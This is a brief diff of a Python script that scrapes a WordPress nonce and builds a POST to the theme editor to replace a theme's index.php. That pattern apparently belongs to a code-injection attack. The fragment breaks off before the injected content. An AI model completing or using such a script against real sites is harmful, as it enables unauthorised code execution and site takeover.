@@ -2,7 +2,7 @@ import requests
 import re
 
 find_nonce = re.compile(r'<input type="hidden" id="nonce" name="nonce" value="([^"]*)" />')
-payload = lambda nonce: {"nonce": "nonce",
+payload = lambda nonce: {"nonce": nonce,
 "_wp_http_referer": "/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen",
 "newcontent":
 """
